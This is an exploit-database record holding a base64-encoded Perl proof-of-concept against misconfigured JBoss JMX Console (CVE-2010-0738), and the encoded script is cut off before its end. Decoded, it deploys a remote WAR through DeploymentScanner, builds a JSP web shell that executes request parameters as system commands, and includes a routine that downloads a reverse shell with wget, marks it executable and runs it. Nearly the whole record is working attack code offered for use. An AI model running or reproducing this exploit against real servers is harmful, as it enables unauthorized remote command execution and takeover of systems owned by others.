{
    "source": "exploit-database", 
    "exploit": "IyEvdXNyL2Jpbi9wZXJsDQojIEV4cGxvaXQgVGl0bGU6IEpCb3NzLCBKTVggQ29uc29sZSwgbWlzY29uZmlndXJlZCBEZXBsb3ltZW50U2Nhbm5lcg0KIyBEYXRlOiBPY3QgMyAyMDExDQojIEF1dGhvcjogeTB1ZyA8YXQ+IGNvZHNlYy5jb20NCiMgVmVyc2lvbjogDQojIFRlc3RlZCBvbjogTGludXgNCiMgQ1ZFIDogQ1ZFLTIwMTAtMDczOA0KIw0KIyBQT0MgYWdhaW5zdCBtaXNjb25maWd1cmVkIEpCb3NzIEpNWCBDb25zb2xlDQojIEl0IHVzZSB0aGUgYWRkVXJsIG1ldGhvZCBpbiBEZXBsb3ltZW50U2Nhbm5lciBtb2R1bGUNCiMNCiMgTW9yZSBpbmZvcm1hdGlvbg0KIyBodHRwOi8vcGFja2V0c3Rvcm1zZWN1cml0eS5vcmcvZmlsZXMvZG93bmxvYWQvMTA1NDc5L0pCb3NzV2hpdGVwYXBlci5wZGYNCiMgaHR0cDovL3BvYy1oYWNrLmJsb2dzcG90LmNvbS8yMDExLzAyL2hvdy10by1oYWNrLWFueS12ZXJzaW9uLW9mLWpib3NzLmh0bWwNCiMNCiMgWW91IG5lZWQgdG8gZWRpdA0KIyAgICAkdXJsX2NtZCB0byBtYXRjaCB0aGUgd2FyIHBheWxvYWQgdXJsDQojICAgICR1cmxfc2hlbGwgaXMgeW91ciByZXZlcnNlIHNoZWxsIHVybCANCiMgICAgICAgICAoIG9ubHkgaWYgeW91IHdhbnQgdG8gdXNlIHJldmVyc2Vfc2hlbGwoImlwIiwgInBvcnQiKSApDQojDQojIFRoZSBKU1Agc2hlbGwgaXMgbm90IG1pbmUgaXMgYXZhaWxhYmxlIGV2ZXJ5IHdoZXJlDQojIEkgYWRkIGEgLWIgcGFyYW0gdGhhdCBidWlsZCB0aGUgd2FyIGNvbnRlbmVyIHRvIGRvIHRoaXMgeW91IG5lZWQgamF2YQ0KIw0KIyBJcyBhIGZhc3QgUE9DIGNvZGVkIHRoaXMgbW9ybmluZyBmb3IgZnVuIHNvIG1heWJlIGl0IGRvbid0IGNvdmVyIGFsbCBjYXNlL3ZlcnNpb24NCiMNCiMgVXNhZ2U6DQojICBCdWlsZCB0aGUgd2FyIGNvbnRlbmVyIChuZWVkIGphdmEpDQojICAgLi9qYm9zcyAtYg0KIyAgSGFjaw0KIyAgIC4vamJvc3MgaHR0cDovL3d3dy52dWxuLmNvbTo4MDgwDQoNCnVzZSBzdHJpY3Q7DQoNCnVzZSBMV1A6OlVzZXJBZ2VudDsNCnVzZSBIVFRQOjpSZXF1ZXN0OjpDb21tb24gcXcoUE9TVCk7DQp1c2UgSFRUUDo6UmVxdWVzdDo6Q29tbW9uIHF3KEdFVCk7DQp1c2UgSU86OlNvY2tldDo6U1NMOw0KdXNlIEN3ZDsNCg0KIyBjb25maWd1cmF0aW9uIHNlY3Rpb24NCm15ICR1cmxfY21kID0gImh0dHA6Ly8xMjcuMC4wLjEvY21kLndhciI7DQpteSAkdXJsX3NoZWxsID0gImh0dHA6Ly8xMjcuMC4wLjEvcmV2ZXJzZS5wbCI7DQpteSAkZGVidWcgPSAwOyAjIDEgdG8gc3dpdGNoIHRvIGRlYnVnDQpteSAkdXNlcmFnZW50ID0gIidNb3ppbGxhLzUuMCAoV2luZG93czsgVTsgV2luZG93cyBOVCA1LjE7IGVuLVVTOyBydjoxLjkuMi4xMikgIi4gICAgICANCiAgICAiR2Vja28vMjAxMDEwMjYgRmlyZWZveC8zLjYuMTIgKCAuTkVUIENMUiAzLjUuMzA3MjkpJyI7DQoNCiMgRG9uJ3QgZWRpdCBmcm9tIGhlcmUNCm15ICRpbnN0YWxsZWQgPSAwOw0KbXkgJHVybDsNCg0KbXkgJHVhID0gTFdQOjpVc2VyQWdlbnQtPm5ldzsNCg0KJFNJR3tJTlR9ID0gInNpZ3RyYXAiOw0KDQpzdWIgZGVidWcgew0KICAgIGlmKCAkZGVidWcgKXsNCiAgICAgICAgcHJpbnQgU1RERVJSICJkZWJ1ZzogIiwgQF8sICJcbiI7DQogICAgfQ0KfQ0KDQpzdWIgY2hlY2tfdXJsIHsNCiAgICBteSAkcmVxdWVzdCA9IEdFVCAiJHVybC9qbXgtY29uc29sZS8iOw0KICAgIG15ICRyZXNwb25zZSA9ICR1YS0+cmVxdWVzdCgkcmVxdWVzdCk7DQogICAgaWYgKCEkcmVzcG9uc2UtPmlzX3N1Y2Nlc3MpIHsNCiAgICAgICAgcHJpbnQgU1RERVJSICRyZXNwb25zZS0+c3RhdHVzX2xpbmUsICJcbiI7DQogICAgICAgIHJldHVybiAtMTsNCiAgICB9DQogICAgcmV0dXJuIDA7DQp9DQoNCnN1YiBzaWd0cmFwIHsNCiAgICBpZiAoICRpbnN0YWxsZWQgKXsNCiAgICAgICAgcHJpbnQgIiBbKl0gQ2xlYW4gb2YgJHVybCBpbiBwcm9ncmVzcy4uLlxuIjsNCiAgICAgICAgY2xlYW5fd2FyKCk7DQogICAgfQ0KICAgIGV4aXQgMTsNCn0NCg0Kc3ViIGZpbmRfbWV0aG9kX2luZGV4IHsNCiAgICBteSAkbWV0aG9kID0gc2hpZnQoQF8pOw0KDQogICAgbXkgJHJlcXVlc3QgPSBHRVQgIiR1cmwvam14LWNvbnNvbGUvSHRtbEFkYXB0b3I/IiAuIA0KICAgICJhY3Rpb249aW5zcGVjdE1CZWFuJm5hbWU9amJvc3MuZGVwbG95bWVudCIgLg0KICAgICIlM0FmbGF2b3IlM0RVUkwlMkN0eXBlJTNERGVwbG95bWVudFNjYW5uZXIiOw0KICAgDQogICAgDQogICAgbXkgJHJlc3BvbnNlID0gJHVhLT5yZXF1ZXN0KCRyZXF1ZXN0KTsNCiAgICBpZiAoISRyZXNwb25zZS0+aXNfc3VjY2Vzcykgew0KICAgICAgICBwcmludCBTVERFUlIgJHJlc3BvbnNlLT5zdGF0dXNfbGluZSwgIlxuIjsNCiAgICAgICAgcmV0dXJuIC0xOw0KICAgIH0NCiAgICBteSAkcGFnZSA9ICRyZXNwb25zZS0+ZGVjb2RlZF9jb250ZW50Ow0KICAgIA0KICAgICMgTWF0Y2ggYSBjZXJ0YWluIGpib3NzIHZlcnNpb24NCiAgICB3aGlsZSAoICRwYWdlID1+IG17PGZvcm0gbWV0aG9kPSJwb3N0IiBhY3Rpb249Ikh0bWxBZGFwdG9yIj4oLio/KTwvZm9ybT59c2cgKXsNCiAgICAgICAgbXkgJGZvcm0gPSAkMTsNCiAgICAgICAgaWYgKCAkZm9ybSA9fiAvJG1ldGhvZC8gKXsNCiAgICAgICAgICAgIGlmICggJGZvcm0gPX4gLzxpbnB1dCB0eXBlPSJoaWRkZW4iIG5hbWU9Im1ldGhvZEluZGV4IiB2YWx1ZT0iKFxkKykiPi8gKXsNCiAgICAgICAgICAgICAgICBkZWJ1ZygibWV0aG9kICRtZXRob2QgYXQgaW5kZXggJDEiKTsNCiAgICAgICAgICAgICAgICByZXR1cm4gJDE7DQogICAgICAgICAgICB9DQogICAgICAgIH0NCiAgICB9DQogICAgDQogICAgIyBNYXRjaCBhbm90aGVyIGpib3NzIHZlcnNpb24NCiAgICB3aGlsZSAoICRwYWdlID1+IG17PHRkIGNsYXNzPSdwYXJhbSc+JG1ldGhvZDwvdGQ+KC4qPyk8L3RyPn1zZyApew0KICAgICAgICBteSAkZm9ybSA9ICQxOw0KICAgICAgICBpZiAoICRmb3JtID1+IC88aW5wdXQgdHlwZT0naGlkZGVuJyBuYW1lPSdtZXRob2RJbmRleCcgdmFsdWU9JyhcZCspJ1wvPi8gKXsNCiAgICAgICAgICAgIGRlYnVnKCJtZXRob2QgJG1ldGhvZCBhdCBpbmRleCAkMSIpOw0KICAgICAgICAgICAgcmV0dXJuICQxOw0KICAgICAgICB9DQogICAgfQ0KICAgIA0KICAgICMgTWF0Y2ggYW5vdGhlciBqYm9zcyB2ZXJzaW9uDQogICAgd2hpbGUgKCAkcGFnZSA9fiBtezxzcGFuIGNsYXNzPSdhbmFtZSc+JG1ldGhvZDwvc3Bhbj4oLio/KTx0YWJsZT59c2cgKXsNCiAgICAgICAgbXkgJGZvcm0gPSAkMTsNCiAgICAgICAgaWYgKCAkZm9ybSA9fiAvPGlucHV0IHR5cGU9ImhpZGRlbiIgbmFtZT0ibWV0aG9kSW5kZXgiIHZhbHVlPSIoXGQrKSIgXC8+LyApew0KICAgICAgICAgICAgZGVidWcoIm1ldGhvZCAkbWV0aG9kIGF0IGluZGV4ICQxIik7DQogICAgICAgICAgICByZXR1cm4gJDE7DQogICAgICAgIH0NCiAgICB9ICAgIA0KICAgIHJldHVybiAtMTsNCn0NCg0Kc3ViIGlzX2luc3RhbGxlZF93YXIgew0KICAgIG15ICRtZXRob2RfaW5kZXggPSBmaW5kX21ldGhvZF9pbmRleCgiaGFzVVJMIik7DQogICAgaWYgKCAkbWV0aG9kX2luZGV4IDwgMCApIHsgcHJpbnQgIkNhbid0IGZpbmQgbWV0aG9kSW5kZXggZm9yIGhhc1VSTFxuIjsgcmV0dXJuIC0xOyB9DQogICAgbXkgJHJlcXVlc3QgPSBQT1NUICIkdXJsL2pteC1jb25zb2xlL0h0bWxBZGFwdG9yIiwgeyBhY3Rpb24gPT4gJ2ludm9rZU9wJywgDQogICAgICAgIG5hbWUgPT4gJ2pib3NzLmRlcGxveW1lbnQ6dHlwZT1EZXBsb3ltZW50U2Nhbm5lcixmbGF2b3I9VVJMJywNCiAgICAgICAgbWV0aG9kSW5kZXggPT4gIiRtZXRob2RfaW5kZXgiLCBhcmcwID0+ICR1cmxfY21kfTsNCiAgICBteSAkcmVzcG9uc2UgPSAkdWEtPnJlcXVlc3QoJHJlcXVlc3QpOw0KICAgIGlmICghJHJlc3BvbnNlLT5pc19zdWNjZXNzKSB7DQogICAgICAgIHByaW50IFNUREVSUiAkcmVzcG9uc2UtPnN0YXR1c19saW5lLCAiXG4iOw0KICAgICAgICByZXR1cm4gLTE7DQogICAgfQ0KICAgIG15ICRwYWdlID0gJHJlc3BvbnNlLT5kZWNvZGVkX2NvbnRlbnQ7DQoNCiAgICBpZiAoICRwYWdlID1+IG17PHByZT4oLio/KTwvcHJlPn1zICl7DQogICAgICAgIG15ICRyZXQgPSAkMTsNCiAgICAgICAgaWYgKCAkcmV0ID1+IC90cnVlLyApew0KICAgICAgICAgICAgcmV0dXJuIDE7DQogICAgICAgIH1lbHNlew0KICAgICAgICAgICAgcmV0dXJuIDA7DQogICAgICAgIH0NCiAgICB9ZWxzZXsNCiAgICAgICAgcHJpbnQgU1RERVJSICJlcnJvcjogb2NjdXJlZCBkdXJpbmcgaXNfaW5zdGFsbGVkX3dhciByZWdleCFcbiI7DQogICAgICAgIHJldHVybiAtMjsNCiAgICB9DQp9DQoNCnN1YiBpbnN0YWxsX3dhciB7DQogICAgaWYgKGlzX2luc3RhbGxlZF93YXIgPT0gMSl7DQogICAgICAgIHByaW50ICIgWypdIEluc3RhbGwgY2FuY2VsZWQsIGFscmVhZHkgaW5zdGFsbGVkXG4iOw0KICAgICAgICByZXR1cm4gMTsNCiAgICB9DQogICAgbXkgJG1ldGhvZF9pbmRleCA9IGZpbmRfbWV0aG9kX2luZGV4KCJhZGRVUkwiKTsNCiAgICBpZiAoICRtZXRob2RfaW5kZXggPCAwICkgeyBwcmludCAiQ2FuJ3QgZmluZCBtZXRob2RJbmRleCBmb3IgYWRkVVJMXG4iOyByZXR1cm4gLTE7IH0NCiAgICANCiAgICBteSAkcmVxdWVzdCA9IFBPU1QgIiR1cmwvam14LWNvbnNvbGUvSHRtbEFkYXB0b3IiLCB7IGFjdGlvbiA9PiAnaW52b2tlT3AnLCANCiAgICAgICAgbmFtZSA9PiAnamJvc3MuZGVwbG95bWVudDp0eXBlPURlcGxveW1lbnRTY2FubmVyLGZsYXZvcj1VUkwnLA0KICAgICAgICBtZXRob2RJbmRleCA9PiAiJG1ldGhvZF9pbmRleCIsIGFyZzAgPT4gJHVybF9jbWR9Ow0KICAgIG15ICRyZXNwb25zZSA9ICR1YS0+cmVxdWVzdCgkcmVxdWVzdCk7DQogICAgaWYgKCEkcmVzcG9uc2UtPmlzX3N1Y2Nlc3MpIHsNCiAgICAgICAgcHJpbnQgU1RERVJSICRyZXNwb25zZS0+c3RhdHVzX2xpbmUsICJcbiI7DQogICAgICAgIHJldHVybiAtMTsNCiAgICB9DQogICAgbXkgJHBhZ2UgPSAkcmVzcG9uc2UtPmRlY29kZWRfY29udGVudDsNCiAgICANCiAgICBpZiAoICRwYWdlID1+IG17PHNwYW4gY2xhc3M9J09wUmVzdWx0Jz4oLio/KTwvc3Bhbj59cyApew0KICAgICAgICBwcmludCAiIFsqXSAiLCB0cmltKCQxKSwgIlxuIjsNCiAgICAgICAgcmV0dXJuIDA7DQogICAgfWVsc2lmICggJHBhZ2UgPX4gbXs8cHJlPiguKj8pPC9wcmU+fXMgKXsNCiAgICAgICAgcHJpbnQgIiBbKl0gIiwgdHJpbSgkMSksICJcbiI7DQogICAgICAgIHJldHVybiAwOw0KICAgIH1lbHNpZiAoICRwYWdlID1+IG17PC90YWJsZT4oLio/KTwvYm9keT59cyApew0KICAgICAgICBwcmludCAiIFsqXSAiLCB0cmltKCQxKSwgIlxuIjsNCiAgICAgICAgcmV0dXJuIDA7DQogICAgfWVsc2V7DQogICAgICAgIHByaW50IFNUREVSUiAiZXJyb3I6IG9jY3VyZWQgZHVyaW5nIGluc3RhbGxfd2FyIHJlZ2V4IVxuIjsNCiAgICAgICAgcmV0dXJuIC0xOw0KICAgIH0NCn0NCg0Kc3ViIGNsZWFuX3dhciB7DQogICAgd2hpbGUoaXNfaW5zdGFsbGVkX3dhciA9PSAxKXsNCiAgICAgICAgaWYgKCB1bmluc3RhbGxfd2FyKCkgPCAwICl7DQogICAgICAgICAgICByZXR1cm4gLTE7DQogICAgICAgIH0NCiAgICB9DQogICAgcHJpbnQgIiBbKl0gQ2xlYW4gY29tcGxldGVcbiI7DQogICAgcmV0dXJuIDA7DQp9DQoNCnN1YiB1bmluc3RhbGxfd2FyIHsNCiAgICBteSAkbWV0aG9kX2luZGV4ID0gZmluZF9tZXRob2RfaW5kZXgoInJlbW92ZVVSTCIpOw0KICAgIGlmICggJG1ldGhvZF9pbmRleCA8IDAgKSB7IHByaW50ICJDYW4ndCBmaW5kIG1ldGhvZEluZGV4IGZvciByZW1vdmVVUkxcbiI7IHJldHVybiAtMTsgfQ0KICAgIG15ICRyZXF1ZXN0ID0gUE9TVCAiJHVybC9qbXgtY29uc29sZS9IdG1sQWRhcHRvciIsIHsgYWN0aW9uID0+ICdpbnZva2VPcCcsIA0KICAgICAgICBuYW1lID0+ICdqYm9zcy5kZXBsb3ltZW50OnR5cGU9RGVwbG95bWVudFNjYW5uZXIsZmxhdm9yPVVSTCcsDQogICAgICAgIG1ldGhvZEluZGV4ID0+ICIkbWV0aG9kX2luZGV4IiwgYXJnMCA9PiAkdXJsX2NtZH07DQogICAgbXkgJHJlc3BvbnNlID0gJHVhLT5yZXF1ZXN0KCRyZXF1ZXN0KTsNCiAgICBpZiAoISRyZXNwb25zZS0+aXNfc3VjY2Vzcykgew0KICAgICAgICBwcmludCBTVERFUlIgJHJlc3BvbnNlLT5zdGF0dXNfbGluZSwgIlxuIjsNCiAgICAgICAgcmV0dXJuIC0xOw0KICAgIH0NCiAgICBteSAkcGFnZSA9ICRyZXNwb25zZS0+ZGVjb2RlZF9jb250ZW50Ow0KICAgIA0KICAgIGlmICggJHBhZ2UgPX4gbXs8c3BhbiBjbGFzcz0nT3BSZXN1bHQnPiguKj8pPC9zcGFuPn1zICl7DQogICAgICAgIHByaW50ICIgWypdICIsIHRyaW0oJDEpLCAiXG4iOw0KICAgICAgICByZXR1cm4gMDsNCiAgICB9ZWxzaWYgKCAkcGFnZSA9fiBtezxwcmU+KC4qPyk8L3ByZT59cyApew0KICAgICAgICBwcmludCAiIFsqXSAiLCB0cmltKCQxKSwgIlxuIjsNCiAgICAgICAgcmV0dXJuIDA7DQogICAgfWVsc2lmICggJHBhZ2UgPX4gbXs8L3RhYmxlPiguKj8pPC9ib2R5Pn1zICl7DQogICAgICAgIHByaW50ICIgWypdICIsIHRyaW0oJDEpLCAiXG4iOw0KICAgICAgICByZXR1cm4gMDsNCiAgICB9ZWxzZXsNCiAgICAgICAgcHJpbnQgU1RERVJSICJlcnJvcjogb2NjdXJlZCBkdXJpbmcgdW5pbnN0YWxsX3dhciByZWdleCFcbiI7DQogICAgICAgIHJldHVybiAtMTsNCiAgICB9DQp9DQoNCnN1YiBleGVjdXRlIHsNCiAgICBteSAkY21kID0gc2hpZnQoQF8pOw0KICAgIHByaW50ICckICcgLiAkY21kIC4gIlxuIjsNCiAgICANCiAgICBteSAkcmVxdWVzdCA9IFBPU1QgIiR1cmwvY21kL2NtZC5qc3AiLCB7IGNtZCA9PiAkY21kfTsNCiAgICBteSAkcmVzcG9uc2UgPSAkdWEtPnJlcXVlc3QoJHJlcXVlc3QpOw0KICAgIGlmICghJHJlc3BvbnNlLT5pc19zdWNjZXNzKSB7DQogICAgICAgIGlmICggJHJlc3BvbnNlLT5jb2RlID09IDQwNCApew0KICAgICAgICAgICAgcHJpbnQgU1RERVJSICJDb21tYW5kIHdhciBjb250ZW5lciBpcyBub3QgaW5zdGFsbGVkIVxuIjsNCiAgICAgICAgfWVsc2V7DQogICAgICAgICAgICBwcmludCBTVERFUlIgJHJlc3BvbnNlLT5zdGF0dXNfbGluZSwgIlxuIjsNCiAgICAgICAgfQ0KICAgICAgICByZXR1cm4gLTE7DQogICAgfQ0KICAgIG15ICRwYWdlID0gJHJlc3BvbnNlLT5kZWNvZGVkX2NvbnRlbnQ7DQogICAgDQogICAgbXkgJGNvbnRlbnQgPSAkcGFnZTsNCg0KICAgIGlmICggJGNvbnRlbnQgPX4gbXs8QlI+KC4qKTwvcHJlPn1zICl7DQogICAgICAgIHByaW50IHRyaW0oJDEpIC4gIlxuIjsNCiAgICAgICAgcmV0dXJuIDA7DQogICAgfWVsc2V7DQogICAgICAgIHByaW50IFNUREVSUiAiZXJyb3I6IG9jY3VyZWQgZHVyaW5nIGV4ZWMgcmVnZXghXG4iOw0KICAgICAgICByZXR1cm4gLTE7DQogICAgfQ0KfQ0KDQpzdWIgcmV2ZXJzZV9zaGVsbCB7DQogICAgbXkgKCRpcCwgJHBvcnQpID0gQF87DQogICAgcHJpbnQgIiBbKl0gcmV2ZXJzZSBzaGVsbCB0byAkaXAgJHBvcnRcbiI7DQogICAgbXkgJGNtZCA9ICJ3Z2V0IC1PIC90bXAvYSAkdXJsX3NoZWxsIjsNCiAgICBpZiAoIGV4ZWN1dGUoJGNtZCkgPCAwICl7DQogICAgICAgIHJldHVybiAtMTsNCiAgICB9DQogICAgaWYgKCBleGVjdXRlKCJjaG1vZCAreCAvdG1wL2EiKSA8IDAgKXsNCiAgICAgICAgcmV0dXJuIC0xOw0KICAgIH0NCiAgICByZXR1cm4gZXhlY3V0ZSgiL3RtcC9hICRpcCAkcG9ydCIpOw0KfQ0KDQpzdWIgdHJpbSgkKXsNCglteSAkc3RyaW5nID0gc2hpZnQ7DQoJJHN0cmluZyA9fiBzL15ccysvLzsNCgkkc3RyaW5nID1+IHMvXHMrJC8vOw0KCXJldHVybiAkc3RyaW5nOw0KfQ0KDQpzdWIgc2V0dXAgew0KICAgIHByaW50ICIgWypdIENoZWNrIHVybCAkdXJsLi4uXG4iOw0KICAgIGlmICggY2hlY2tfdXJsKCkgPCAwICl7DQogICAgICAgIHByaW50ICJVcmwgJHVybCBub3QgYXZhaWxhYmxlIVxuIjsNCiAgICAgICAgcmV0dXJuIC0xOw0KICAgIH0NCiAgICANCiAgICBwcmludCAiIFsqXSBUcnkgdG8gaW5zdGFsbCBjb21tYW5kIHdhciBjb250ZW5lci4uLlxuIjsNCiAgICByZXR1cm4gaW5zdGFsbF93YXI7DQp9DQoNCnN1YiBjaGVja19jbWQgew0KICAgIG15ICR0ID0gNTsNCiAgICBmb3IoIG15ICRpID0gMTsgJGkgPD0gJHQgOyArKyRpICl7DQogICAgICAgIG15ICRyZXF1ZXN0ID0gR0VUICIkdXJsL2NtZC9jbWQuanNwIjsNCiAgICAgICAgbXkgJHJlc3BvbnNlID0gJHVhLT5yZXF1ZXN0KCRyZXF1ZXN0KTsNCiAgICAgICAgaWYgKCEkcmVzcG9uc2UtPmlzX3N1Y2Nlc3MpIHsNCiAgICAgICAgICAgIGlmICggJHJlc3BvbnNlLT5jb2RlICE9IDQwNCApew0KICAgICAgICAgICAgICAgIHByaW50IFNUREVSUiAkcmVzcG9uc2UtPnN0YXR1c19saW5lLCAiXG4iOw0KICAgICAgICAgICAgICAgIHJldHVybiAwOw0KICAgICAgICAgICAgfQ0KICAgICAgICAgICAgcHJpbnQoIiBbKl0gY2hlY2tfY21kICRpLyR0IGZhaWxlZFxuIik7DQogICAgICAgIH1lbHNlew0KICAgICAgICAgICAgcHJpbnQoIiBbKl0gY2hlY2tfY21kICRpLyR0IG9rLCBnb2dvZ28hXG4iKTsNCiAgICAgICAgICAgIHJldHVybiAxOw0KICAgICAgICB9DQogICAgICAgIGlmICggJGkgPCAkdC0xKSB7c2xlZXAoMTUpOyB9DQogICB9DQogICByZXR1cm4gMDsNCn0NCg0Kc3ViIGhlbHAgew0KICAgIHByaW50ICJIZWxwXG4iOw0KICAgIHByaW50ICIgLSBJcyBhIHBlcmwgc2hlbGwgc28geW91IGNhbiBjYWxsIHBlcmwgZnVuY3Rpb25cbiI7DQogICAgcHJpbnQgIiA+IGV4ZWN1dGUoXCJpZFwiKSAjIGV4ZWN1dGUgdGhlIGNvbW1hbmRlXG4iOw0KICAgIHByaW50ICIgPiByZXZlcnNlX3NoZWxsKFwiOC44LjguOFwiLCBcIjE5MTJcIikgIyBkb3dubG9hZCB5b3VyIHJldmVyc2Ugc2hlbGwgYW5kIGV4ZWN1dGUgaXRcbiI7DQogICAgcHJpbnQgIiA+IGNsZWFuICMgcmVtb3ZlIHRoZSB3YXIgY29udGVuZXIgZnJvbSB0aGUgc2VydmVyXG4iOw0KICAgIHByaW50ICIgPiBjaGVja19jbWQgIyBsb29wIHVudGlsIGNvbW1hbmQgYXZhaWxhYmxlXG4iOw0KICAgIHByaW50ICIgPiBpbnN0YWxsX3dhciAjIGluc3RhbGwgdGhlIHdhciBjb250ZW5lciBmcm9tIHVybFxuIjsNCiAgICBwcmludCAiID4gZXhpdCAjIGNsZWFuIGFuZCBxdWl0XG4iOw0KICAgIHByaW50ICIgPiBleGl0ZCAjIGV4aXQgd2l0aG91dCBjbGVhbmluZ1xuIjsNCn0NCg0Kc3ViIGJ1aWxkX3dhciB7DQogICAgbXkgJGpzcF9maWxlID0gImNtZC5qc3AiOw0KICAgIG9wZW4oIG15ICRqc3Bfb3V0cHV0LCAnPicsICRqc3BfZmlsZSApIG9yIA0KICAgICAgICBkaWUoIkNhbid0IG9wZW4gJGpzcF9maWxlIDogJCEiKTsNCg0KICAgIHByaW50ICRqc3Bfb3V0cHV0IDw8RU9GOw0KPCVAIHBhZ2UgaW1wb3J0PSJqYXZhLnV0aWwuKixqYXZhLmlvLioiJT4NCjwlDQolPg0KPEhUTUw+PEJPRFk+DQpDb21tYW5kcyB3aXRoIEpTUA0KPEZPUk0gTUVUSE9EPSJHRVQiIE5BTUU9Im15Zm9ybSIgQUNUSU9OPSIiPg0KPElOUFVUIFRZUEU9InRleHQiIE5BTUU9ImNtZCI+DQo8SU5QVVQgVFlQRT0ic3VibWl0IiBWQUxVRT0iU2VuZCI+DQo8L0ZPUk0+DQo8cHJlPg0KPCUNCmlmIChyZXF1ZXN0LmdldFBhcmFtZXRlcigiY21kIikgIT0gbnVsbCkgew0Kb3V0LnByaW50bG4oIkNvbW1hbmQ6ICIgKyByZXF1ZXN0LmdldFBhcmFtZXRlcigiY21kIikgKyAiPEJSPiIpOw0KUHJvY2VzcyBwID0gUnVudGltZS5nZXRSdW50aW1lKCkuZXhlYyhyZXF1ZXN0LmdldFBhcmFtZXRlcigiY21kIikpOw0KT3V0cHV0U3RyZWFtIG9zID0gcC5nZXRPdXRwdXRTdHJlYW0oKTsNCklucHV0U3RyZWFtIGluID0gcC5nZXRJbnB1dFN0cmVhbSgpOw0KRGF0YUlucHV0U3RyZWFtIGRpcyA9IG5ldyBEYXRhSW5wdXRTdHJlYW0oaW4pOw0KU3RyaW5nIGRpc3IgPSBkaXMucmVhZExpbmUoKTsNCndoaWxlICggZGlzciAhPSBudWxsICkgew0Kb3V0LnByaW50bG4oZGlzcik7DQpkaXNyID0gZGlzLnJlYWRMaW5lKCk7DQp9DQp9DQolPg0KPC9wcmU+DQo8L0JPRFk+PC9IVE1MPg0KRU9GDQoNCiAgICBjbG9zZSgkanNwX291dHB1dCk7DQoNCiAgICBta2RpciAiV0VCLUlORiI7DQogICAgbXkgJHhtbF9maWxlID0gIldFQi1JTkYvd2ViLnhtbCI7DQogICAgb3BlbiggbXkgJHhtbF9vdXRwdXQsICc+JywgJHhtbF9maWxlICkgb3IgDQogICAgICAgIGRpZSgiQ2FuJ3Qgb3BlbiAkeG1sX2ZpbGUgOiAkISIpOw0KICAgIHByaW50ICR4bWxfb3V0cHV0IDw8RU9GOw0KPD94bWwgdmVyc2lvbj0iMS4wIiA/Pg0KPHdlYi1hcHAgeG1sbnM9Imh0dHA6Ly9qYXZhLnN1bi5jb20veG1sL25zL2oyZWUiDQp4bWxuczp4c2k9Imh0dHA6Ly93d3cudzMub3JnLzIwMDEvWE1MU2NoZW1hLWluc3RhbmNlIg0KeHNpOnNjaGVtYUxvY2F0aW9uPSJodHRwOi8vamF2YS5zdW4uY29tL3htbC9ucy9qMmVlDQpodHRwOi8vamF2YS5zdW4uY29tL3htbC9ucy9qMmVlL3dlYi1hcHBfMl80LnhzZCINCnZlcnNpb249IjIuNCI+DQo8c2VydmxldD4NCjxzZXJ2bGV0LW5hbWU+Q29tbWFuZDwvc2VydmxldC1uYW1lPg0KPGpzcC1maWxlPi9jbWQuanNwPC9qc3AtZmlsZT4NCjwvc2VydmxldD4NCjwvd2ViLWFwcD4NCkVPRg0KICAgIGNsb3NlKCR4bWxfb3V0cHV0KTsNCg0KICAgIHN5c3RlbSgiamFyIGN2ZiBjbWQud2FyIFdFQi1JTkYvICRqc3BfZmlsZSIpOw0KICAgIHVubGluaygkeG1sX2ZpbGUpOw0KICAgIHVubGluaygkanNwX2ZpbGUpOw0KICAgIHJtZGlyKCJXRUItSU5GIik7DQogICAgDQogICAgcHJpbnQgIiBbKl0gV2FyIGNvbnRlbmVyIGlzIGhlcmUgIiwgZ2V0Y3dkLCAiL2NtZC53YXJcbiI7DQogICAgcHJpbnQgIiBbKl0gVXBsb2FkIGl0IHRvIHlvdXIgc2VydmVyIGFuZCB1cGRhdGUgc2NyaXB0IHVybFxuIjsNCn0NCg0Kc3ViIHNoZWxsIHsNCiAgICBkbyB7DQogICAgICAgIHByaW50KCI+ICIpOw0KICAgICAgICBjaG9wKCRfID0gPFNURElOPik7DQogICAgICAgIGlmICggJF8gZXEgImhlbHAiICkgeyBoZWxwKCk7IH0NCiAgICAgICAgaWYgKCAkXyBlcSAiZXhpdGQiICkgeyBleGl0IDA7IH0NCiAgICAgICAgZWxzaWYgKCAkXyBuZSAiZXhpdCIgKXsgIGV2YWwoJF8pOyB9DQogICAgICAgIHdhcm4oKSBpZiAkQDsNCiAgICB9IHdoaWxlICgkXyBuZSAiZXhpdCIpOw0KfQ0KDQppZigkI0FSR1YrMSAhPSAxKXsNCiAgICBwcmludCAiIFsqXSBFeHBsb2l0IFRpdGxlOiBKQm9zcywgSk1YIENvbnNvbGUsIG1pc2NvbmZpZ3VyZWQgRGVwbG95bWVudFNjYW5uZXJcbiI7DQogICAgcHJpbnQgIiBbKl0gRGF0ZTogT2N0IDMgMjAxMVxuIjsNCiAgICBwcmludCAiIFsqXSBBdXRob3I6IHkwdWcgPGF0PiBjb2RzZWMuY29tXG4iOw0KICAgIHByaW50ICIgWypdIFZlcnNpb246IDAuMVxuIjsNCiAgICBwcmludCAiIFsqXSBKU1Agc2hlbGwgdXJsICR1cmxfY21kXG5cbiI7DQogICAgcHJpbnQgIiBbKl0gVXNhZ2U6XG4iOw0KICAgIHByaW50ICIgIEJ1aWxkIHRoZSB3YXIgY29udGVuZXIgKG5lZWQgamF2YSlcbiI7DQogICAgcHJpbnQgIiAkMCAtYlxuIjsNCiAgICBwcmludCAiICBIYWNrXG4iOw0KICAgIHByaW50ICIgJDAgaHR0cDovL3d3dy52dWxuLmNvbTo4MDgwXG5cbiI7DQogICAgDQogICAgDQogICAgZXhpdCAxOw0KfQ0KDQppZigkQVJHVlswXSBlcSAiLWIiKXsNCiAgICBidWlsZF93YXI7DQogICAgZXhpdCAwOw0KfQ0KDQokdXJsID0gJEFSR1ZbMF07DQoNCiR1YS0+YWdlbnQoJHVzZXJhZ2VudCk7DQoNCnByaW50ICIgWypdIEpTUCBzaGVsbCB1cmwgJHVybF9jbWRcbiI7DQoNCmlmICggc2V0dXAoKSA8IDAgKXsNCiAgICBwcmludCAiIFsqXSBTZXR1cCBmYWlsZWQhXG4iOw0KICAgIGV4aXQgMTsNCn0NCiRpbnN0YWxsZWQgPSAxOw0KcHJpbnQgIiBbKl0gV2FpdCBmZXcgbWludXRlcywgdGltZXMgdG8gSkJvc3MgdG8gbG9hZCB0aGUgdXJsXG4iOw0KcHJpbnQgIiBbKl0gWW91IGNhbiBmaW5kIHRoZSBzaGVsbCBoZXJlIHRvb1xuIjsNCnByaW50ICIgWypdICR1cmwvY21kL2NtZC5qc3BcbiI7DQoNCmlmICggY2hlY2tfY21kKCkgPD0g